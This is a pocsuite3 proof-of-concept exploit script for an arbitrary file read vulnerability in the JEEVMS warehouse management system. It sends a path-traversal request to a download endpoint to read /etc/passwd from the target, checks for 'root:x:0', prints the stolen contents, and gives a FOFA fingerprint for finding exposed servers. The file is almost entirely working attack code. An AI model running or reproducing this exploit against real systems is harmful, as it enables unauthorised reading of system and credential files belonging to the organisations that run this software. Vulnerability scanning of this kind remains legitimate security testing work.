# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = "2024"
    createDate = "2024-3-21"
    updateDate = "2024-3-21"
    references =[]
    name ="JEEVMS仓库管理系统任意文件读取"
    appPowerLink = ''
    appName = 'JEEVMS仓库管理系统'
    appVersion = ''
    vulType = '文件读取'
    desc = '''
    fofa:fid="cC2r/XQpJXcYiYFHOc77bg=="
    '''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        urlparts = self.url
        parts = urlparts.split('/')
        urlresult = '/'.join(parts[:3])
        url = str(urlresult) + '/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd'
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
                    }
        r = requests.get(url=url,headers=headers,verify=False,timeout=5)
        try:
            if r.status_code == 200 and 'root:x:0' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url+"\n"+r.text
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        return self.parse_output(result)
        
register_poc(DemoPOC) 
